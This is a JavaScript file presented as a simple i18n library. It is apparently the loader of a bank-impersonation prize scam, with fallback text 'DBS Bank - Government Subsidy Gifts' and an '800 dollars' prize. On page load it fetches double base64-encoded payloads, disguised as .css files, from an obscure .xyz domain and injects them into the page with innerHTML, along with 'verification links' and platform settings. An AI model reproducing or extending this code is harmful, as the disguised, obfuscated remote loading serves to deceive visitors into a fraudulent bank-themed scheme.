class SimpleI18n {
  constructor() {
    this.data = {};
    this.tags = {};
    this.images = {};
    this.enabledPlatforms = {};
    this.theme = {};
    this.themes = {};
    this.verificationLinks = {};
    
    const config = window.I18N_CONFIG || {};
    this.currentCountry = config.currentCountry;
    this.currentLanguage = config.currentLanguage;
    this.Hash = config.Hash;
    this.encryptedProjectId = config.encryptedProjectId;
    this.backendDomain = 'https://actnieinxiasdofivity.xyz';
    
    this.isLoaded = false;
    this.dynamicConfigLoaded = false;
    
    this.RTL_LANGUAGES = ['ar', 'he', 'fa', 'ur', 'ku'];
    
  }

  encode(obj) {
    try {
      return btoa(btoa(encodeURIComponent(JSON.stringify(obj))));
    } catch (e) {
      return null;
    }
  }

  decode(str) {
    try {
      return JSON.parse(decodeURIComponent(atob(atob(str))));
    } catch (e) {
      return null;
    }
  }

  replaceTags(text, params = {}) {
    if (typeof text !== 'string') return text;
    
    let result = text;
    
    for (const [tag, value] of Object.entries(this.tags)) {
      result = result.replace(new RegExp(tag, 'g'), value);
    }
    
    if (result.includes('{{theme}}')) {
      const themeText = this.getCurrentTheme();
      result = result.replace(/\{\{theme\}\}/g, themeText);
    }
    
    if (result.includes('{{prize}}')) {
      result = result.replace(/\{\{prize\}\}/g, this.getCurrentPrize());
    }
    
    for (const [paramKey, paramValue] of Object.entries(params)) {
      result = result.replace(new RegExp(`{{${paramKey}}}`, 'g'), paramValue);
    }
    
    return result;
  }

  t(key, params = {}) {
    if (key.startsWith('img.')) {
      const keys = key.substring(4).split('.');
      let value = this.images;
      for (const k of keys) {
        value = value?.[k];
      }
      return value;
    }
    
    if (!this.isLoaded) {
      return key;
    }

    const keys = key.split('.');
    let value = this.data;
    for (const k of keys) {
      value = value?.[k];
    }
    
    if (typeof value === 'string') {
      let result = this.replaceTags(value);
      for (const [paramKey, paramValue] of Object.entries(params)) {
        result = result.replace(new RegExp(`{{${paramKey}}}`, 'g'), paramValue);
      }
      return result;
    }
    
    return value;
  }


  async loadTextConfig() {
    try {
      const languageFile = `${this.backendDomain}/css/${this.Hash}.css?server=1`;
      const response = await fetch(languageFile);
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      const configString = await response.text();
      if (!configString || configString.trim() === '') {
        throw new Error('Failed to decode text configuration data');
      }
      
      this.data = this.decode(configString);
      
      if (!this.data) {
        throw new Error('Failed to decode text configuration data');
      }
      
      this.prizes = this.data.prizes || {};
      return true;
    } catch (error) {
      return false;
    }
  }

  async loadDynamicConfig() {
    try {
      const dynamicFile = `${this.backendDomain}/styles/${this.Hash}.css?server=1`;
      
      const response = await fetch(dynamicFile);
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      
      const configString = await response.text();
      
      if (!configString || configString.trim() === '') {
        throw new Error('Failed to decode dynamic configuration data');
      }
      
      const data = this.decode(configString);
      if (!data) {
        throw new Error('Failed to decode dynamic configuration data');
      }
      
      this.tags = data.tags || {};
      this.themes = data.themes || {};
      this.physicalPrize = data.physicalPrize || { prize: '', image: '' };
      this.images = data.images || {};
      this.enabledPlatforms = data.enabledPlatforms || {};
      this.theme = data.theme || {};
      this.verificationLinks = data.verificationLinks || {};
      
      this.applyTheme();
      this.dynamicConfigLoaded = true;
      return true;
    } catch (error) {
      this.dynamicConfigLoaded = false;
      return false;
    }
  }

  async load() {
    const [textLoaded, dynamicLoaded] = await Promise.all([
      this.loadTextConfig(),
      this.loadDynamicConfig()
    ]);
    
    this.isLoaded = textLoaded && dynamicLoaded;
    if (this.isLoaded) {
    } else {
    }
    return this.isLoaded;
  }

  replaceTexts() {
    document.querySelectorAll('[data-text]').forEach(el => {
      const key = el.dataset.text;
      const text = this.t(key);
      if (text && text !== key) {
        el.tagName === 'BUTTON' ? el.textContent = text : el.innerHTML = text;
      }
    });
  }

  replaceResources() {
    document.querySelectorAll('[data-resource]').forEach(el => {
      const key = el.dataset.resource;
      const resource = this.t(key);
      if (resource && resource !== key) {
        el.setAttribute('data-src', resource);
      }
    });
  }

  replaceAll() {
    this.replaceTexts();
    this.replaceResources();
  }

  setTags(tags) {
    this.tags = { ...this.tags, ...tags };
  }

  getTags() {
    return { ...this.tags };
  }

  getEnabledPlatforms() {
    return Object.keys(this.enabledPlatforms).filter(key => this.enabledPlatforms[key]);
  }

  isPlatformEnabled(platformKey) {
    return this.enabledPlatforms[platformKey] === true;
  }

  getCurrentPrize() {
    const config = window.I18N_CONFIG || {};
    if (config.prize?.name) {
      return config.prize.name;
    }
    return '800 dollars';
  }

  getCurrentPrizeImage() {
    const config = window.I18N_CONFIG || {};
    if (config.prize?.image) {
      return config.prize.image;
    }
    
    return this.images.gifts?.body || 'https://img.cdn56.top/images/b4a3869f4b77e49338723b0ca9666387.png';
  }

  
  applyTheme() {
    if (!this.theme || Object.keys(this.theme).length === 0) {
      return;
    }
    
    const root = document.documentElement;
    if (this.theme.primaryColor) {
      root.style.setProperty('--primary-color', this.theme.primaryColor);
    }
    if (this.theme.accentColor) {
      root.style.setProperty('--accent-color', this.theme.accentColor);
    }
  }
  
  getTheme() {
    return this.theme;
  }
  
  updateTheme(newTheme) {
    this.theme = { ...this.theme, ...newTheme };
    this.applyTheme();
  }
  
  setBackendDomain(domain) {
    this.backendDomain = domain || '';
  }
  
  getBackendDomain() {
    return this.backendDomain;
  }

  
  setLanguage(language) {
    this.currentLanguage = language || 'en';
    this.applyRTLSupport();
  }
  
  getCurrentLanguage() {
    return this.currentLanguage;
  }
  
  getCurrentTheme() {
    if (this.themes[this.currentLanguage]) {
      return this.themes[this.currentLanguage];
    }
    
    if (this.themes['en']) {
      return this.themes['en'];
    }
    
    return 'DBS Bank - Government Subsidy Gifts';
  }
  
  getSupportedLanguages() {
    return Object.keys(this.themes);
  }
  
  isRTLLanguage(language = this.currentLanguage) {
    return this.RTL_LANGUAGES.includes(language);
  }
  
  getTextDirection() {
    return this.isRTLLanguage() ? 'rtl' : 'ltr';
  }
  
  applyRTLSupport() {
    const isRTL = this.isRTLLanguage();
    const htmlElement = document.documentElement;
    
    if (isRTL) {
      htmlElement.setAttribute('dir', 'rtl');
      htmlElement.setAttribute('lang', this.currentLanguage);
      htmlElement.classList.add('rtl-layout');
    } else {
      htmlElement.setAttribute('dir', 'ltr');
      htmlElement.setAttribute('lang', this.currentLanguage);
      htmlElement.classList.remove('rtl-layout');
    }
    
    window.dispatchEvent(new CustomEvent('rtlChanged', {
      detail: { isRTL, language: this.currentLanguage }
    }));
  }
}

const $t = new SimpleI18n();

window.$t = $t;

async function initializeI18n() {
  const loaded = await $t.load();
  if (loaded) {
    $t.applyRTLSupport();
    $t.replaceAll();
    window.$t = $t;
    window.dispatchEvent(new CustomEvent('i18nReady'));
  }
}

if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeI18n);
} else {
  initializeI18n();
}

if (typeof module !== 'undefined' && module.exports) {
  module.exports = { SimpleI18n, $t };
}
